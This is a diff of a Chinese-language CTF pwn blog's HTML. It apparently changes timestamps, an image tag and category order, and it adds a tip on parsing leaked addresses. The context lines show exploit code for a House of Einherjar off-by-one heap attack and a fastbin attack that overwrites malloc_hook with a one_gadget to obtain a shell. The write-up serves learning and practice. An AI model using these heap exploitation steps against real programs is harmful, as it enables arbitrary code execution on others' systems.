@@ -186,7 +186,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-04-29 21:56:12" itemprop="dateModified" datetime="2025-04-29T21:56:12+08:00">2025-04-29</time>
+                <time title="修改时间：2025-04-30 14:27:13" itemprop="dateModified" datetime="2025-04-30T14:27:13+08:00">2025-04-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -260,7 +260,7 @@
 <h3 id="HOE"><a href="#HOE" class="headerlink" title="HOE"></a>HOE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#HOE</span></span><br><span class="line">pause()</span><br><span class="line">add(<span class="string">&#x27;240&#x27;</span>,<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x10</span>)<span class="comment">#index 1 -&gt; chunk3</span></span><br><span class="line">add(<span class="string">&#x27;128&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment">#p64(0) + p64(0xb0 + 0x40))#伪造fake_chunk</span></span><br><span class="line">    <span class="comment">#+ p64(heap_addr + 0xb0 + 0x40) + p64(heap_addr + 0xb0 + 0x40))</span></span><br><span class="line">    <span class="comment">#index 2 -&gt; chunk1</span></span><br><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;104&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0xc0</span> + <span class="number">0x40</span>))<span class="comment">#利用off by one漏洞修改chunk3的P位</span></span><br><span class="line"><span class="comment">#index 3 -&gt; chunk2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;1&#x27;</span>)<span class="comment">#触发堆块后向合并</span></span><br></pre></td></tr></table></figure>
 
 <p>这里<code>dele(‘2’)</code>后chunk1的<code>fd</code>和<code>bk</code>会指向同一处<code>main_arena</code>,同时这块<code>main_arena</code>的<code>fd</code>和<code>bk</code>也都会指向chunk1,所以可以直接通过<code>unlink</code>检查</p>
-<p>这里第九行还有个点需要注意,由于程序的add方法是根据你输入的size的大小来决定输入长度的,但我们都知道malloc申请堆块是向0x10对齐的,且是<em>5舍6入</em>,我们申请104(0x68)大小的内存时其实只给了0x60的大小,剩下0x8可以直接覆盖掉chunk3的prev_size位,再通过off by null控制chunk3的P位![4](..&#x2F;images&#x2F;house of einherjar&#x2F;4.png)</p>
+<p>这里第九行还有个点需要注意,由于程序的add方法是根据你输入的size的大小来决定输入长度的,但我们都知道malloc申请堆块是向0x10对齐的,且是<em>5舍6入</em>,我们申请104(0x68)大小的内存时其实只给了0x60的大小,剩下0x8可以直接覆盖掉chunk3的prev_size位,再通过off by null控制chunk3的P位<img src="/../images/house-of-einherjar/4.png" alt="4"></p>
 <h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;240&#x27;</span>,<span class="string">b&#x27;e&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="string">&#x27;96&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&#x27;96&#x27;</span>,<span class="string">b&#x27;g&#x27;</span> * <span class="number">0x13</span> + p64(ogg[<span class="number">1</span>] + libc_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
 
 <p>通过fastbin attack将<code>malloc_hook</code>申请到堆块重叠的部分,再通过别的指针将其改为ogg</p>
@@ -313,10 +313,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-04-26 13:31:49 / 修改时间：15:30:47" itemprop="dateCreated datePublished" datetime="2025-04-26T13:31:49+08:00">2025-04-26</time>
+              <time title="创建时间：2025-04-26 13:31:49" itemprop="dateCreated datePublished" datetime="2025-04-26T13:31:49+08:00">2025-04-26</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-30 14:29:45" itemprop="dateModified" datetime="2025-04-30T14:29:45+08:00">2025-04-30</time>
+              </span>
 
           
 
@@ -347,6 +353,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">raw_bytes = r(<span class="number">14</span>)<span class="comment">#接收数据</span></span><br><span class="line">hex_str = raw_bytes.decode().lstrip(<span class="string">&#x27;0x&#x27;</span>)<span class="comment">#.rstrip(&#x27;\x00&#x27;) 如果结尾有多的&#x27;\x00&#x27;还需要.rstrip(&#x27;\x00&#x27;)来进行去除</span></span><br><span class="line">hex_data = <span class="built_in">bytes</span>.fromhex(hex_str)  <span class="comment">#转换为字节</span></span><br><span class="line">reversed_bytes = hex_data[::-<span class="number">1</span>]  <span class="comment">#反序</span></span><br></pre></td></tr></table></figure>
 
 <p>然后就可以使用u64(reversed_bytes.ljust(8,b’\x00’))对其处理在写入payload中</p>
+<p>有师傅说可以直接用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
+
+<p>直接一步进行处理,我自己还是见识太少了,另外师傅tql orz</p>
 <h1 id="puts的情况"><a href="#puts的情况" class="headerlink" title="puts的情况"></a>puts的情况</h1><p>构造ROP链来使puts函数泄露libc地址应该是最常见的情况了,puts函数也是输出的字符串,为什么就可以直接通过u64(p.recv(6).ljust(8,b’\x00’))来获得libc地址呢?</p>
 <p>在构造payload输出的时候虽然输出的是字符串,但这个字符串本质是直接根据字节数据通过诸如ascii转换而来的,也就是,输出的数据仍是原来的字节,而不是像printf那样输出的是将每四位数据对应的字符将这个字符作为一个单独的字节输出</p>
 
@@ -587,11 +597,11 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                 </span>
             </span>
 
